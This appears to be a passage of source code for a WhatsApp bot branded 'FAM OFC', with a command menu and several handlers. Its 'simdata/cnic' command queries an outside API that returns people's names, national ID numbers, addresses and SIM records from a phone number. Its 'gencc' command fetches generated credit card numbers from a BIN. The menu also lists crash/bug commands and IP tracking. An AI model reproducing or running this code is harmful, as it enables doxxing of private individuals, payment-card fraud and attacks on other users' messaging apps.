┃╰━━━━━━━━━╾•
┃╭━━━━━━━━━╾•
┃┃│⃟🚫➢ ${prefix}sim
┃┃│⃟🚫➢ ${prefix}simdata
┃┃│⃟🚫➢ ${prefix}cnic
┃┃│⃟🚫➢ ${prefix}gen
┃┃│⃟🚫➢ ${prefix}gencc
┃╰━━━━━━━━│⃟⭕➢
┃╭━━━━━━━━━╾•
┃┃ ⚠️ BUG_MENU ⚠️ 
┃╰━━━━━━━━━╾•
┃╭━━━━━━━━━╾•
┃┃│⃟🚫➢ ${prefix}crash
┃┃│⃟🚫➢ ${prefix}bug
┃┃│⃟🚫➢ ${prefix}infinity
┃┃│⃟🚫➢ ${prefix}gcbug
┃┃│⃟🚫➢ ${prefix}gccrash
┃╰━━━━━━━━│⃟⭕➢
┃╭━━━━━━━━━╾•
┃┃ ⚠️ MEDIA_MENU ⚠️ 
┃╰━━━━━━━━━╾•
┃╭━━━━━━━━━╾•
┃┃│⃟🚫➢ ${prefix}aivideo
┃┃│⃟🚫➢ ${prefix}pin
┃┃│⃟🚫➢ ${prefix}pinsrc
┃┃│⃟🚫➢ ${prefix}pinimg
┃┃│⃟🚫➢ ${prefix}pinterest
┃┃│⃟🚫➢ ${prefix}rvo
┃┃│⃟🚫➢ ${prefix}readviewonce
┃┃│⃟🚫➢ ${prefix}vv
┃╰━━━━━━━━│⃟⭕➢
┃╭━━━━━━━━━╾•
┃┃ ⚠️ GROUP_MENU ⚠️ 
┃╰━━━━━━━━━╾•
┃╭━━━━━━━━━╾•
┃┃│⃟🚫➢ ${prefix}kick
┃┃│⃟🚫➢ ${prefix}invtag
┃┃│⃟🚫➢ ${prefix}clean
┃╰━━━━━━━━│⃟⭕➢
┃╭━━━━━━━━━╾•
┃┃ ⚠️ CHANNEL_MENU ⚠️ 
┃╰━━━━━━━━━╾•
┃╭━━━━━━━━━╾•
┃┃│⃟🚫➢ ${prefix}idch
┃┃│⃟🚫➢ ${prefix}cekidch
┃╰━━━━━━━━│⃟⭕➢
┃╭━━━━━━━━━╾•
┃┃ ⚠️ TOOLS_MENU ⚠️ 
┃╰━━━━━━━━━╾•
┃╭━━━━━━━━━╾•
┃┃│⃟🚫➢ ${prefix}obfuscate
┃┃│⃟🚫➢ ${prefix}trackip
┃╰━━━━━━━━│⃟⭕➢
╰━━━━❦︎│⃟⭕➢𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐅𝐀𝐌𝐎𝐅𝐂
▰▱▰▱▰▱▰▱▰▱▰▱▰▱
`;

      const msg = {
        interactiveMessage: {
          title: teks, 
          image: fs.readFileSync('./media/famofc.jpg'), 
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: "𝕱𝖆𝖒𝖔𝖋𝖈 𝖂𝖆𝖇𝖔𝖙 ",
                url: "t.me/famofc",
                copy_code: "PAK BOT",
                expiration_time: Date.now() * 999
              },
              bottom_sheet: {
                in_thread_buttons_limit: 4,
                divider_indices: [1, 2, 3, 4, 5, 999],
                list_title: "𝕱𝖆𝖒𝖔𝖋𝖈 𝖂𝖆𝖇𝖔𝖙 ",
                button_title: "⚠️"
              }
            }),
            buttons: [
                          {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "🌐 TOOLKIT!",
                  url: "https://famofc.site"
                })
              }, 
                {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "🎊 ALL MENU!", 
                  id: ".allmenu"
                })
              }, 
                          {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "🏓 PONG!", 
                  id: "ping"
                })
              }, 

              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "😎 RUNTIME!", 
                  id: "runtime"
                })
              }, 
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "💕 THANKS TO!", 
                  id: "friends"
                })
              }, 
              {
                name: "address_message",
                buttonParamsJson: "{}"
              }
            ]
          }
        }
      };
  
      WaSocket.sendMessage(m.chat, msg, {
        quoted: x
      })
    }
    break;
    case 'sim':
case 'simdata':
case 'cnic': {
    if (!text) {
        await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        return m.reply(`❌ *Please provide a phone number or CNIC!*\n*Phone Examples:* ${prefix}simdata 03XX-XXXXXXX\n*CNIC Examples:* ${prefix}simdata 32402-1402507-1\n\n🔥 *Powered by FAM OFC*`);
    }
    const cleanInput = text.replace(/[^\d+-]/g, '');
    const isCNIC = /^\d{5}[-]?\d{7}[-]?\d{1}$/.test(cleanInput) || /^\d{13}$/.test(cleanInput);
    let queryType = 'number';
    let queryValue = '';
    if (isCNIC) {
        queryType = 'cnic';
        queryValue = cleanInput.replace(/-/g, '');
        if (queryValue.length !== 13) {
            await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return m.reply(`❌ *Invalid CNIC!* Must be 13 digits.\nExample: 32402-1402507-1\n\n🔥 *Powered by FAM OFC*`);
        }
    } else {
        queryType = 'number';
        let phoneNumber = cleanInput.replace(/\D/g, '');
        if (phoneNumber.length === 12 && phoneNumber.startsWith('92')) {
            phoneNumber = '0' + phoneNumber.substring(2);
        } else if (phoneNumber.length === 13 && phoneNumber.startsWith('92')) {
            phoneNumber = '0' + phoneNumber.substring(2);
        } else if (phoneNumber.length === 11 && phoneNumber.startsWith('92')) {
            phoneNumber = '0' + phoneNumber.substring(2);
        } else if (phoneNumber.length > 10) {
            phoneNumber = phoneNumber.slice(-10);
        }
        if (!/^3\d{9}$/.test(phoneNumber)) {
            await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return m.reply(`❌ *Invalid phone number!*\nValid formats: 03XX-XXXXXXX, +923XX-XXXXXXX, 3338570120\n\n🔥 *Powered by FAM OFC*`);
        }
        queryValue = phoneNumber;
    }
    await WaSocket.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
    try {
        const axios = require('axios');
        const apiUrl = `https://fam-official.serv00.net/api/database.php?number=${encodeURIComponent(queryValue)}`;
        const searchMsg = queryType === 'cnic' 
            ? `🔍 *Searching CNIC:* ${formatCNIC(queryValue)}\n⏳ Please wait...`
            : `🔍 *Searching Phone:* ${formatPhone(queryValue)}\n⏳ Please wait...`;
        const searchMessage = await m.reply(searchMsg);
        const response = await axios.get(apiUrl, {
            timeout: 40000,
            headers: {
                'User-Agent': 'FAM-OFC-Bot/1.0',
                'Accept': 'application/json'
            }
        });
        const data = response.data;
        if (!data.success || !data.data || !data.data.records || !Array.isArray(data.data.records) || data.data.records.length === 0) {
            await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            const queryWhat = queryType === 'cnic' ? 'CNIC' : 'phone number';
            return m.reply(`❌ *No data found* for ${queryWhat} ${queryType === 'cnic' ? formatCNIC(queryValue) : formatPhone(queryValue)}\n\n🔥 *Powered by FAM OFC*`);
        }
        const records = data.data.records;
        const recordsCount = data.data.records_count || records.length;
        let formattedResponse = `✅ *SIM DATABASE RESULTS*\n`;
        formattedResponse += `🔍 *Query Type:* ${queryType === 'cnic' ? 'CNIC' : 'Phone Number'}\n`;
        formattedResponse += queryType === 'cnic' 
            ? `🆔 *CNIC:* ${formatCNIC(queryValue)}\n`
            : `📞 *Phone:* ${formatPhone(queryValue)}\n`;
        formattedResponse += `📊 *Total Records:* ${recordsCount}\n`;
        formattedResponse += `╭─────────────\n`;
        records.forEach((record, index) => {
            formattedResponse += `│ 📌 *Record ${index + 1}:*\n`;
            formattedResponse += `│ • 👤 *Name:* ${record.full_name || 'Unknown'}\n`;
            formattedResponse += `│ • 📞 *Number:* ${record.phone || 'Unknown'}\n`;
            let cnicFormatted = record.cnic || 'Unknown';
            if (cnicFormatted.length === 13) {
                cnicFormatted = formatCNIC(cnicFormatted);
            }
            formattedResponse += `│ • 🆔 *CNIC:* ${cnicFormatted}\n`;
            formattedResponse += `│ • 🏠 *Address:* ${record.address?.trim() || 'Unknown'}\n`;
            if (record.sim_company) {
                formattedResponse += `│ • 📱 *SIM Company:* ${record.sim_company}\n`;
            }
            if (record.registration_date) {
                formattedResponse += `│ • 📅 *Reg Date:* ${record.registration_date}\n`;
            }
            if (index < records.length - 1) formattedResponse += `│ ─────────────\n`;
        });
        formattedResponse += `╰─────────────\n`;
        formattedResponse += `🔍 ${data.credit || 'Powered by FAM OFC'}\n`;
        formattedResponse += `📢 *Join:* https://whatsapp.com/channel/0029VbAnF9Q9hXFERv7Stc2v\n`;
        formattedResponse += `⚠️ *For legal purposes only*\n\n`;
        formattedResponse += `🔥 *Powered by FAM OFC*`;
        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: {
                        body: { text: formattedResponse },
                        footer: { text: "Database lookup completed" },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "📋 Copy SIM Data",
                                        copy_code: formattedResponse
                                    })
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "🌐 Join Channel",
                                        url: "https://whatsapp.com/channel/0029VbAnF9Q9hXFERv7Stc2v"
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        }, { quoted: x });
        await WaSocket.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
        if (searchMessage) {
            await WaSocket.sendMessage(m.chat, { delete: searchMessage.key });
        }
        await WaSocket.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (error) {
        console.error("SIMDATA Error:", error);
        await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        if (error.code === 'ECONNABORTED' || error.message?.includes('timeout')) {
            await m.reply(`❌ *Request timeout!* Try again later.\n\n🔥 *Powered by FAM OFC*`);
        } else if (error.response?.status === 404) {
            await m.reply(`❌ *API endpoint not found!* Contact owner.\n\n🔥 *Powered by FAM OFC*`);
        } else if (error.response?.status === 429) {
            await m.reply(`❌ *Too many requests!* Wait before retry.\n\n🔥 *Powered by FAM OFC*`);
        } else if (error.response?.data) {
            await m.reply(`❌ *API Error!* ${JSON.stringify(error.response.data)}\n\n🔥 *Powered by FAM OFC*`);
        } else {
            await m.reply(`❌ *Failed to retrieve SIM data!* ${error.message || 'Unknown error'}\n\n🔥 *Powered by FAM OFC*`);
        }
    }
}
break;


case 'gen':
case 'gencc': {

    if (!text) return m.reply(
      `📌 *Usage:* ${prefix + command} BIN|MM|YYYY\n` +
      `Example:\n${prefix + command} 523938|10|2026`
    );

    try {
        await WaSocket.sendMessage(m.chat, { react: { text: '💳', key: m.key } });

        const axios = require('axios');
        const binInput = encodeURIComponent(args.join(' '));
        const api = `https://fam-official.serv00.net/api/ccgen.php?bin=${binInput}&count=10`;

        const { data } = await axios.get(api, { timeout: 30000 });
        if (!Array.isArray(data) || !data.length)
            return m.reply("❌ *CC generate nahi hui*");

        let ccText = `💳 *CREDIT CARD GENERATOR*\n\n`;
        data.forEach(cc => ccText += `${cc}\n`);
        ccText += `\n🔥 *Powered by FAM OFC*`;

        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: {
                        body: { text: ccText },
                        footer: { text: "🔥 Powered by FAM OFC" },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "📋 Copy CCs",
                                        copy_code: ccText
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        }, { quoted: x });

        await WaSocket.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
        await WaSocket.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (e) {
        console.error("CCGEN Error:", e);
        await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        m.reply("❌ *CC generation failed*");
    }
}
break;

    case "systeminfo": {
      const totalMem = os.totalmem();
      const freeMem = os.freemem();
      const usedMem = totalMem - freeMem;
                
      const usedGB = Math.floor(usedMem / 1024 / 1024 / 1024);
      const totalGB = Math.floor(totalMem / 1024 / 1024 / 1024);
                
      let timestamp = Date.now();
      let latensi = Date.now() - timestamp;

      WaSocket.sendMessage(m.chat, { 
        pollResultMessage: { 
          name: "System Info", 
          pollVotes: [
            {
              optionName: "Speed (ms)",
              optionVoteCount: Math.max(1, Math.floor(latensi)) 
            },
            {
              optionName: "RAM Used (GB)",
              optionVoteCount: usedGB
            },
            {
              optionName: "Total RAM (GB)",
              optionVoteCount: totalGB
            }
          ], 
          newsletter: {
            newsletterJid: "120363419700263280@newsletter", 
            newsletterName: "Famofc | Information"
          }
        } 
      }, { quoted: x });
    }
    break;
    case "friends": {
      const teks = `There's My Family who help me in 2025 - 2026`;
      const msg = {
        interactiveMessage: {
          title: teks, 
          image: fs.readFileSync('./media/famofc.jpg'), 
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: "𝕱𝖆𝖒𝖔𝖋𝖈 𝖂𝖆𝖇𝖔𝖙 ",
                url: "t.me/famofc",
                copy_code: "famofc",
                expiration_time: Date.now() * 999
              },
              bottom_sheet: {
                in_thread_buttons_limit: 1,
                divider_indices: [1, 2, 3, 4, 5, 999],
                list_title: "𝕱𝖆𝖒𝖔𝖋𝖈 𝖂𝖆𝖇𝖔𝖙 ",
                button_title: "̷F̷a̷̷m̷ ̷H̷̷4̷̷K̷̷3̷̷R̷ "
              }
            }),
            buttons: [
              {
                name: "galaxy_message", 
                buttonParamsJson: JSON.stringify({
                  flow_cta: "╭───「 ̷F̷a̷̷m̷ ̷H̷̷4̷̷K̷̷3̷̷R̷  」", 
                  flow_message_version: "3", 
                  flow_id: ".menu"
                })
              }, 
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  flow_cta: "│ ▢ wiki cyber", 
                  flow_message_version: "3", 
                  flow_id: ".menu"
                })
              }, 
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  flow_cta: "│ ▢ professor Amar", 
                  flow_message_version: "3", 
                  flow_id: ".menu"
                })
              }, 
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  flow_cta: "│ ▢ Rishi Hart maker", 
                  flow_message_version: "3", 
                  flow_id: ".menu"
                })
              }, 
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  flow_cta: "│ ▢ Nader md", 
                  flow_message_version: "3", 
                  flow_id: ".menu"
                })
              }, 
              {
                name: "galaxy_message", 
                buttonParamsJson: JSON.stringify({
                  flow_cta: "╰──────────⊱", 
                  flow_message_version: "3", 
                  flow_id: ".menu"
                })
              }
            ]
          }
        }
      };
  
      WaSocket.sendMessage(m.chat, msg, {
        quoted: x
      })
    }
    break;
    case "info": {
      const infogetclone1 = m.quoted ? {
        [m.quoted.mtype]:m.quoted
      } : {
        [m.message.mtype]:m.message
      };
      const formattedJson = JSON.stringify(infogetclone1, null, 2);
      famofcreply(`${formattedJson}`)
    }
    break;
    case "meid": {
      famofcreply(`${WaSocket.user.id}`)
    }
    break;
    case "tsid": {
      famofcreply(`${m.chat}`)
    }
    break;
    case "invtag": {
      if (!isAdmins) return famofcreply("Only admins can use this command")
if (!isBotAdmins) return famofcreply("Only admins can use this command")
      let member = groupMetadata.participants.map(e => e.id)
      await WaSocket.relayMessage(m.chat, {
       albumMessage: {
       contextInfo: {
       mentionedJid: [...member]
       }
       }
      }, {})
    }
    break;
    
    default:
      if (budy && budy.startsWith('>')) {
        if (!isOwner) return;
        try {
          let evaled = await eval(budy.slice(2));
          if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
          famofcreply(evaled);
        } catch (err) {
          famofcreply(String(err));
        }
      }
  }
  
} catch (err) {
  console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
  delete require.cache[file];
  require(file);
});